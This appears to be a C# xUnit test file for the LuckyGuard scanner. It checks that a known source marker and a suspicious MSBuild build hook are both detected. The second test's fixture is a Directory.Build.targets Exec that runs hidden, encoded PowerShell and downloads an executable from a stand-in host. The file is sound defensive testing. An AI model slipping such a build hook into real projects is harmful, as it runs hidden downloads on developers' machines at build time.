using LuckyGuard.Core.Scanning;
using LuckyGuard.Guard;

namespace LuckyGuard.Tests;

public sealed class GuardFocusedDeveloperScannerTests
{
    [Fact]
    public async Task SourceFile_Marker_IsDetectedWithoutProjectWideTarget()
    {
        string dir = Path.Combine(Path.GetTempPath(), "lg-guard-src-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        string file = Path.Combine(dir, "x.cpp");
        await File.WriteAllTextAsync(file, "namespace VccLibaries {} // NtExploreProcess");
        try
        {
            var target = new ScanTarget(ScanTargetKind.File, file);
            var result = await new ScanCoordinator([new GuardFocusedDeveloperScanner()]).ScanAsync(target);
            Assert.Contains(result.Findings, f => f.Id == "LW.SOURCE.KNOWN_MARKER");
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public async Task TargetsFile_SuspiciousCommand_IsDetected()
    {
        string dir = Path.Combine(Path.GetTempPath(), "lg-guard-msbuild-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        string file = Path.Combine(dir, "Directory.Build.targets");
        await File.WriteAllTextAsync(file, "<Project><Target Name=\"X\"><Exec Command=\"powershell -WindowStyle Hidden -EncodedCommand QQ==; Invoke-WebRequest https://example.invalid/x -OutFile %TEMP%\\x.exe\" /></Target></Project>");
        try
        {
            var target = new ScanTarget(ScanTargetKind.File, file);
            var result = await new ScanCoordinator([new GuardFocusedDeveloperScanner()]).ScanAsync(target);
            Assert.Contains(result.Findings, f => f.Id == "LW.MSBUILD.SUSPICIOUS_EXECUTION_CHAIN");
        }
        finally { Directory.Delete(dir, true); }
    }
}
